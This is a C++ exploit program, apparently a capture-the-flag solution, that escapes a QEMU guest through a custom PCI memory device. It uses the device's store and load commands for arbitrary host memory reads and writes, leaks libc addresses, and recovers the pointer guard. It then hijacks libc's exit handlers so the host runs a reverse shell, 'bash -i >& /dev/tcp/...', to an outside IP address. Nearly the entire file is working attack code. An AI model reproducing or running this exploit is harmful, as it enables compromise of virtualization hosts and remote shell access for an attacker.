#include <fcntl.h>
#include <inttypes.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

#include <cstdint>
#include <cstring>
#include <optional>
#include <vector>

#define PAGE_SHIFT 12
#define PAGE_SIZE (1 << PAGE_SHIFT)
#define PAGE_PRESENT (1ull << 63)
#define PFN_MASK ((1ull << 55) - 1)

#define CHECK(condition)                                              \
  do {                                                                \
    if (!(condition)) {                                               \
      CheckFailure("Check failed at %s:%d: %s\n", __FILE__, __LINE__, \
                   #condition);                                       \
    }                                                                 \
  } while (0);

#define PCHECK(condition)                                                  \
  do {                                                                     \
    if (!(condition)) {                                                    \
      CheckFailure("Check failed at %s:%d (%m): %s\n", __FILE__, __LINE__, \
                   #condition);                                            \
    }                                                                      \
  } while (0);

void CheckFailure(const char* format, ...) {
  //asm("int3");
  va_list ap;
  va_start(ap, format);
  vfprintf(stderr, format, ap);
  va_end(ap);
  abort();
}

template <class Tp>
inline void DoNotOptimize(Tp& value) {
  asm volatile("" : "+r,m"(value) : : "memory");
}

void Pause() {
  printf("Pause...");
  fflush(stdout);
  getchar();
}

struct PCIMemoDevHdr {
  uintptr_t sdma_addr;
  uint32_t key;
  union {
    uint32_t len;
    uint32_t pgoff;
  };
  uintptr_t addr_ram;
};

volatile PCIMemoDevHdr* mmio;
int pagemap_fd = -1;
int pio_fd = -1;
int mmio_fd = -1;

uintptr_t VirtToPhys(void* va) {
  uintptr_t pg = (uintptr_t)va / PAGE_SIZE;
  uint64_t pagemap_entry;
  PCHECK(pread(pagemap_fd, &pagemap_entry, sizeof(pagemap_entry),
               pg * sizeof(pagemap_entry)) == sizeof(pagemap_entry));
  if (!(pagemap_entry & PAGE_PRESENT)) {
    return -1;
  }
  const uintptr_t pfn = pagemap_entry & PFN_MASK;
  const uintptr_t page_offset = (uintptr_t)va & ((1 << PAGE_SHIFT) - 1);
  return pfn * PAGE_SIZE + page_offset;
}

#define PORT_GET_RESULT 0
#define PORT_GET_INTFLAG 1

#define PORT_SET_COMMAND 0
#define PORT_DROP_IRQ 1

#define CMD_STORE_GETKEY 0x10
#define CMD_STORE_PAGE 0x11
#define CMD_STORE_FIN 0x12
#define CMD_LOAD_SETKEY 0x20
#define CMD_LOAD_PAGE 0x21
#define CMD_LOAD_FIN 0x22

#define RESULT_COMPLETE 0x00
#define RESULT_INPROGRESS 0x01
#define RESULT_FAILED 0xff

#define INT_CMD (1 << 0)
#define INT_READ_FILE (1 << 1)
#define INT_WRITE_FILE (1 << 2)
#define INT_SDMA (1 << 3)

uint8_t GetResult() {
  uint8_t result;
  PCHECK(pread(pio_fd, &result, sizeof(result), PORT_GET_RESULT) ==
         sizeof(result));
  return result;
}

uint8_t GetIntFlag() {
  uint8_t result;
  PCHECK(pread(pio_fd, &result, sizeof(result), PORT_GET_INTFLAG) ==
         sizeof(result));
  return result;
}

void DropIrq(uint8_t int_flag) {
  PCHECK(pwrite(pio_fd, &int_flag, sizeof(int_flag), PORT_DROP_IRQ) ==
         sizeof(int_flag));
}

uint8_t SendCommand(uint8_t command) {
  DropIrq(1 << 5);
  PCHECK(pwrite(pio_fd, &command, sizeof(command), PORT_SET_COMMAND) ==
         sizeof(command));
  while (GetIntFlag()) {
    usleep(100);
  }
  return GetResult();
}

uintptr_t orig_addr_ram;

std::optional<uint32_t> SaveFromHost(uintptr_t addr_ram_last_4_bytes) {
  mmio->sdma_addr = 0xffffffffffffffff;
  mmio->addr_ram = addr_ram_last_4_bytes;
  mmio->len = 1;

  CHECK(SendCommand(CMD_STORE_GETKEY) == RESULT_COMPLETE);

  std::optional<uint32_t> key = mmio->key;

  mmio->pgoff = 0;
  if (SendCommand(CMD_STORE_PAGE) != RESULT_COMPLETE) {
    key = std::nullopt;
  }

  CHECK(SendCommand(CMD_STORE_FIN) == RESULT_COMPLETE);

  return key;
}

uint32_t SaveFromGuest(void* page) {
  mmio->sdma_addr = VirtToPhys(page);
  mmio->addr_ram = orig_addr_ram;
  mmio->len = 1;

  CHECK(SendCommand(CMD_STORE_GETKEY) == RESULT_COMPLETE);
  const uint32_t key = mmio->key;

  mmio->pgoff = 0;
  CHECK(SendCommand(CMD_STORE_PAGE) == RESULT_COMPLETE);
  CHECK(SendCommand(CMD_STORE_FIN) == RESULT_COMPLETE);

  return key;
}

void RestoreToHost(uintptr_t key, uintptr_t addr_ram_last_4_bytes) {
  mmio->addr_ram = addr_ram_last_4_bytes;
  mmio->key = key;
  mmio->sdma_addr = 0xffffffffffffffff;

  CHECK(SendCommand(CMD_LOAD_SETKEY) == RESULT_COMPLETE);
  CHECK(SendCommand(CMD_LOAD_PAGE) == RESULT_COMPLETE);
  CHECK(SendCommand(CMD_LOAD_FIN) == RESULT_COMPLETE);
}

void RestoreToGuest(uintptr_t key, void* page) {
  mmio->addr_ram = orig_addr_ram;
  mmio->key = key;
  mmio->sdma_addr = VirtToPhys(page);

  CHECK(SendCommand(CMD_LOAD_SETKEY) == RESULT_COMPLETE);
  CHECK(SendCommand(CMD_LOAD_PAGE) == RESULT_COMPLETE);
  CHECK(SendCommand(CMD_LOAD_FIN) == RESULT_COMPLETE);
}

bool ReadToGuest(uintptr_t addr_ram_last_4_bytes, void* page) {
  auto key = SaveFromHost(addr_ram_last_4_bytes);
  if (!key.has_value()) {
    return false;
  }
  RestoreToGuest(*key, page);
  return true;
}

void WriteToHost(uintptr_t addr_ram_last_4_bytes, void* page) {
  const uint32_t key = SaveFromGuest(page);
  RestoreToHost(key, addr_ram_last_4_bytes);
}

bool IsLibcBase(void* page) {
  constexpr uint8_t kLibcBuildId[] = {0x22, 0x9b, 0x7d, 0xc5, 0x09, 0x05, 0x3f,
                                      0xe4, 0xdf, 0x5e, 0x29, 0xe8, 0x62, 0x99,
                                      0x11, 0xf0, 0xc3, 0xbc, 0x66, 0xdd};
  return memcmp(page, "\x7f\x45\x4c\x46", 4) == 0 &&
         memcmp(reinterpret_cast<char*>(page) + 912, kLibcBuildId,
                sizeof(kLibcBuildId)) == 0;
}

uintptr_t RotateLeft(uintptr_t value, uintptr_t amount) {
  return (value << amount) | (value >> (64 - amount));
}

uintptr_t RotateRight(uintptr_t value, uintptr_t amount) {
  return RotateLeft(value, 64 - amount);
}

uintptr_t Mangle(uintptr_t pointer_guard, uintptr_t value) {
  value ^= pointer_guard;
  return RotateLeft(value, 17);
}

int main(int argc, char** argv) {
  pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
  PCHECK(pagemap_fd != -1);

  pio_fd =
      open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
  PCHECK(pio_fd != -1);

  mmio_fd =
      open("/sys/devices/pci0000:00/0000:00:04.0/resource1", O_RDWR | O_SYNC);
  PCHECK(mmio_fd != -1);

  mmio = reinterpret_cast<volatile PCIMemoDevHdr*>(
      mmap(nullptr, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0));
  PCHECK(mmio != MAP_FAILED);

  char* page =
      reinterpret_cast<char*>(mmap(nullptr, 4096, PROT_READ | PROT_WRITE,
                                   MAP_ANONYMOUS | MAP_PRIVATE, -1, 0));
  PCHECK(page != MAP_FAILED);
  PCHECK(mlock(page, 4096) == 0);

  printf("Physical page: 0x%" PRIxPTR "\n", VirtToPhys(page));

  orig_addr_ram = mmio->addr_ram;
  printf("RAM addr (lower 4 bytes): 0x%" PRIxPTR "\n", orig_addr_ram);
  printf("Int flag: %d\n", GetIntFlag());

  auto read8 = [&](uintptr_t addr) {
    CHECK((addr & 0xfff) <= 0xff8);
    uintptr_t result;
    CHECK(ReadToGuest(addr & ~0xfffl, page));
    memcpy(&result, page + (addr & 0xfff), sizeof(result));
    return result;
  };

  auto write8 = [&](uintptr_t addr, uintptr_t value) {
    CHECK((addr & 0xfff) <= 0xff8);
    CHECK(ReadToGuest(addr & ~0xfffl, page));
    memcpy(page + (addr & 0xfff), &value, sizeof(value));
    WriteToHost(addr & ~0xfffl, page);
  };

  uintptr_t siglongjmp_ret_addr = read8(orig_addr_ram - 0x78);
  uintptr_t libc_base = siglongjmp_ret_addr - 0x42222;
  printf("libc_base = 0x%" PRIxPTR "\n", libc_base);

  uintptr_t exit_handlers = libc_base + 0x219838;
  printf("exit_handlers = 0x%" PRIxPTR "\n", exit_handlers);

  uintptr_t dl_allocate_tls_got = libc_base + 0x219170;
  uintptr_t dl_allocate_tls = read8(dl_allocate_tls_got);
  uintptr_t dl_base = dl_allocate_tls - 0x147a0;
  uintptr_t first_atexit_func = dl_base + 0x6040;

  uintptr_t handler_list = read8(exit_handlers);
  uintptr_t mangled_handler = read8(handler_list + 0x18);
  uintptr_t pointer_guard =
      RotateRight(mangled_handler, 17) ^ first_atexit_func;
  printf("pointer_guard = 0x%" PRIxPTR "\n", pointer_guard);

  uintptr_t libc_system = libc_base + 0x50d60;
  uintptr_t bin_sh = libc_base + 0x1D8698;

  write8(exit_handlers, exit_handlers + 4088);

  write8(exit_handlers + 4096, 1);                                   // index
  write8(exit_handlers + 4104, 4);                                   // flavor
  write8(exit_handlers + 4112, Mangle(pointer_guard, libc_system));  // flavor
  write8(exit_handlers + 4120, exit_handlers + 4128);                // command

  uintptr_t command[8];
  strcpy(reinterpret_cast<char*>(command),
         "bash -c 'bash -i >& /dev/tcp/35.247.37.198/5556 0>&1'");
  for (int i = 0; i < 8; ++i) {
    write8(exit_handlers + 4128 + i * 8, command[i]);
  }

  // Note: This exploit relies on the kernel exploit crashing the kernel
  // to cause qemu to exit.
  return 0;
}
